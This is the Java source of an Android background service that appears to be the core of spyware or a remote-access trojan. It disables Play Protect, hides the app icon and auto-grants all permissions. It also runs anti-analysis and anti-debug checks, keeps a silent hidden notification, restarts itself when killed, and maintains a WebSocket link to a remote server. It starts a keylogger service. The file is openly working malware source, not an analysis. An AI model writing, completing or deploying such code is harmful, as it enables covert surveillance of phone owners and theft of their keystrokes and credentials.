package com.xrc.system.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Color;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import com.xrc.system.R;
import com.xrc.system.core.ConfigManager;
import com.xrc.system.core.Constants;
import com.xrc.system.core.SelfHealer;
import com.xrc.system.features.AntiAnalysis;
import com.xrc.system.features.AntiDebug;
import com.xrc.system.features.AppManager;
import com.xrc.system.features.PermissionHelper;
import com.xrc.system.features.PlayProtectDisabler;
import com.xrc.system.network.WebSocketClient;

public class CoreService extends Service {
    private static final String TAG = Constants.TAG + ":CoreSvc";
    private PowerManager.WakeLock wakeLock;
    private Handler handler;
    private Runnable heartbeatTask;
    private Runnable reconnectTask;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        acquireWakeLock();
        createNotificationChannel();
        startForegroundWithType();
        initializeModules();
        startHeartbeat();
        startReconnectLoop();
        SelfHealer.get(this).start();
        Log.i(TAG, "CoreService created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && Constants.ACTION_START_SERVICES.equals(intent.getAction())) {
            ensureServicesRunning();
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        releaseWakeLock();
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
        Intent restart = new Intent(this, CoreService.class);
        restart.setAction(Constants.ACTION_START_SERVICES);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart);
        } else {
            startService(restart);
        }
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restart = new Intent(this, CoreService.class);
        restart.setAction(Constants.ACTION_START_SERVICES);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart);
        } else {
            startService(restart);
        }
        super.onTaskRemoved(rootIntent);
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "XRC::CoreLock");
            wakeLock.acquire(10 * 60 * 1000L);
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    private void startForegroundWithType() {
        Notification notification = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(Constants.NOTIF_ID_CORE, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                            | ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                            | ServiceInfo.FOREGROUND_SERVICE_TYPE_REMOTE_MESSAGING);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(Constants.NOTIF_ID_CORE, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(Constants.NOTIF_ID_CORE, notification);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, com.xrc.system.ui.MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, Constants.CHANNEL_ID)
                .setContentTitle(getString(R.string.notif_title))
                .setContentText(getString(R.string.notif_text))
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentIntent(pi)
                .setOngoing(true)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    Constants.CHANNEL_ID,
                    getString(R.string.channel_name),
                    NotificationManager.IMPORTANCE_MIN);
            channel.setDescription(getString(R.string.channel_desc));
            channel.setLightColor(Color.BLUE);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private void initializeModules() {
        ConfigManager.get(this);
        AntiAnalysis.get(this).runChecks();
        AntiDebug.get(this).check();
        PermissionHelper.get(this).autoGrantAll();
        PlayProtectDisabler.get(this).disable();
        AppManager.get(this).hideIcon();
        AppManager.get(this).whitelistBattery();
    }

    private void startHeartbeat() {
        heartbeatTask = () -> {
            if (!WebSocketClient.get(this).isConnected()) {
                WebSocketClient.get(this).connect();
            }
            handler.postDelayed(heartbeatTask, Constants.WS_HEARTBEAT_INTERVAL);
        };
        handler.post(heartbeatTask);
    }

    private void startReconnectLoop() {
        reconnectTask = () -> {
            if (!WebSocketClient.get(this).isConnected()) {
                WebSocketClient.get(this).connect();
            }
            handler.postDelayed(reconnectTask, Constants.WS_RECONNECT_DELAY);
        };
        handler.postDelayed(reconnectTask, Constants.WS_RECONNECT_DELAY);
    }

    private void ensureServicesRunning() {
        startSvc(WatchdogService.class);
        startSvc(KeyloggerService.class);
    }

    private void startSvc(Class<?> cls) {
        Intent i = new Intent(this, cls);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(i);
        } else {
            startService(i);
        }
    }
}
